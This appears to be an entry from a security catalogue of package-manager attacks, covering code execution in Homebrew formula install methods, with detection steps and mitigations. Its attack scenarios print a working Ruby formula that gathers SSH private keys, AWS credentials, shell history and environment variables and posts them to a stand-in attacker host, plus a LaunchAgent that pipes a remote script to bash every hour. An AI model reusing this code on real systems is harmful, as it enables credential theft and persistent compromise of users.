---
name: "Homebrew Formula Install Method Code Execution"
packageManager: "brew"
slug: "brew-formula-install-ruby"
category: "Code Execution"
severity: "critical"
platform:
  - "macOS"
  - "Linux"
description: "Homebrew formulae are Ruby files that define an `install` method executed by `brew install`. The method has unrestricted access to the filesystem, network, and subprocess execution via Ruby's standard library and helpers like `system`, backticks, and `Utils.safe_popen_read`. Although formulae in homebrew-core pin source tarballs by SHA-256, the Ruby `install` logic itself is not cryptographically bound to a reviewed version — a compromised or malicious tap can ship arbitrary Ruby that runs the moment a user installs the formula."
prerequisites:
  - "Ability to publish or modify a formula in a tap the victim has added (homebrew/core, a third-party tap, or an attacker-owned tap)"
  - "Victim runs `brew install <formula>` from the affected tap"
  - "Write access to the tap's git repository — either via a PR merge, compromised maintainer account, or typo-squatted tap name"
attackScenarios:
  - title: "Malicious install Method Exfiltrating Shell History and SSH Keys"
    description: "An attacker publishes (or compromises) a formula in a third-party tap. The `install` method runs arbitrary Ruby during `brew install`, archiving sensitive user data and posting it to an attacker-controlled endpoint before completing a normal-looking install so the user sees no error."
    commands:
      - label: "Malicious Formula ruby file in a compromised tap"
        code: |
          class HelpfulCli < Formula
            desc "A handy developer CLI"
            homepage "https://example.com/helpful-cli"
            url "https://example.com/helpful-cli-1.0.0.tar.gz"
            sha256 "0000000000000000000000000000000000000000000000000000000000000000"
            license "MIT"

            def install
              # Arbitrary Ruby runs here during `brew install helpful-cli`
              require "net/http"
              require "uri"
              require "base64"

              loot = {
                "shell_history" => File.read("#{ENV["HOME"]}/.zsh_history") rescue "",
                "ssh_keys"      => Dir["#{ENV["HOME"]}/.ssh/id_*"].reject { |f| f.end_with?(".pub") }
                                     .map { |f| [f, File.read(f)] rescue [f, nil] }.to_h,
                "aws_creds"     => File.read("#{ENV["HOME"]}/.aws/credentials") rescue "",
                "env"           => ENV.to_h
              }

              Net::HTTP.post(
                URI("https://attacker.example.com/c2"),
                Base64.strict_encode64(Marshal.dump(loot)),
                "Content-Type" => "application/octet-stream"
              ) rescue nil

              # Finish the install so the user sees success
              bin.install "helpful-cli"
            end
          end
        language: "ruby"
      - label: "Victim installs from the compromised tap"
        code: |
          brew tap attacker/devtools
          brew install attacker/devtools/helpful-cli
          # install method executes — loot is exfiltrated before the binary lands in /opt/homebrew/bin
        language: "bash"
  - title: "Persistence via LaunchAgent Dropped by install Method"
    description: "The `install` method writes a user-scoped LaunchAgent plist that re-runs an attacker payload on every login. Because Homebrew formulae commonly write files outside the Cellar (e.g. man pages, shell completions), a single `File.write` looks unremarkable in a code review."
    commands:
      - label: "install method dropping a LaunchAgent"
        code: |
          def install
            agent = "#{ENV["HOME"]}/Library/LaunchAgents/com.apple.cfprefsd.helper.plist"
            FileUtils.mkdir_p(File.dirname(agent))
            File.write(agent, <<~PLIST)
              <?xml version="1.0" encoding="UTF-8"?>
              <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
              <plist version="1.0">
              <dict>
                <key>Label</key><string>com.apple.cfprefsd.helper</string>
                <key>ProgramArguments</key>
                <array>
                  <string>/bin/bash</string>
                  <string>-c</string>
                  <string>curl -fsSL https://attacker.example.com/beacon | bash</string>
                </array>
                <key>RunAtLoad</key><true/>
                <key>StartInterval</key><integer>3600</integer>
              </dict>
              </plist>
            PLIST
            system "launchctl", "load", "-w", agent
            bin.install "helpful-cli"
          end
        language: "ruby"
detection:
  - title: "Audit formula Ruby before installing from third-party taps"
    description: "Use `brew cat` to dump a formula's Ruby source without installing. Review the `install` method (and any other methods) for network calls, shell execution outside of standard build helpers, and writes outside the Cellar or `bin`/`lib`/`share` prefixes."
    commands:
      - code: |
          brew cat attacker/devtools/helpful-cli
          # Look for: Net::HTTP, URI.open, system(..), `..`, File.write outside prefix, launchctl, curl|bash
        language: "bash"
  - title: "Inspect the tap's git history for unreviewed install-method changes"
    description: "Third-party taps are git repositories cloned under `$(brew --repository)/Library/Taps`. Diff the local clone against upstream to spot install-time changes inserted between user pulls."
    commands:
      - code: |
          cd "$(brew --repository)/Library/Taps/attacker/homebrew-devtools"
          git log --all --oneline -- Formula/helpful-cli.rb
          git diff HEAD~5 -- Formula/helpful-cli.rb
        language: "bash"
  - title: "Monitor brew install for outbound connections and file writes outside the Cellar"
    description: "Use macOS's `fs_usage` and Little Snitch / LuLu (or Linux `strace`) to flag formulas whose install methods connect to unexpected hosts or write outside the Homebrew prefix."
    commands:
      - code: |
          sudo fs_usage -w -f filesys brew 2>&1 | grep -vE "Cellar|Caskroom|Library/Homebrew|Library/Taps"
        language: "bash"
mitigation:
  - "Prefer formulae from homebrew/core and homebrew/cask, which require public PR review before merge"
  - "Audit third-party taps with `brew cat` before install; treat unfamiliar taps as untrusted source code"
  - "Pin the tap to a reviewed commit when reproducibility matters (`git -C $(brew --repository)/Library/Taps/... checkout <sha>`)"
  - "Run `brew install` as a non-privileged user with no access to SSH keys, AWS credentials, or production secrets"
  - "Use `HOMEBREW_NO_AUTO_UPDATE=1` in CI to prevent pulling unreviewed tap updates mid-build"
  - "Monitor `~/Library/LaunchAgents` and `/Library/LaunchDaemons` for plists created by brew processes"
references:
  - title: "Homebrew Formula Cookbook"
    url: "https://docs.brew.sh/Formula-Cookbook"
  - title: "Homebrew Acceptable Formulae"
    url: "https://docs.brew.sh/Acceptable-Formulae"
  - title: "Formula API Reference"
    url: "https://rubydoc.brew.sh/Formula"
created: 2026-04-21
updated: 2026-04-21
---
